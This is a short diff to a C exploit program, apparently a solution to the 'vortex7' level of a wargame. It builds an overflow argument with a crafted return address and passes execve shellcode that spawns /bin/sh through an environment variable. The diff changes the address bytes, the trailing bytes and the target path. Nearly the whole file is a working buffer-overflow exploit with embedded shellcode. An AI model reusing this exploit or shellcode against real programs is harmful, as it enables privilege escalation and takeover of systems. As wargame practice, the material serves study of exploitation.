@@ -1,7 +1,7 @@
 #include <unistd.h>
 
 int main(void) {
-	char *argv[3] = {"./vortex7", "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJJKKKKLLLLMMMMNNNNOOOOP""\xbf\xdf\xff\xff""2fu9Jh", 0};
+	char *argv[3] = {"./vortex7", "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJJKKKKLLLLMMMMNNNNOOOOP""\xb9\xdf\xff\xff""EduTc0", 0};
 	char *env[2] = {"SHE\xc1\xdf\xff\xff""DE=\x50\xd4\xff\xff\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80", 0};
-	execve("./vortex7", argv, env);
+	execve("/vortex/vortex7", argv, env);
 }
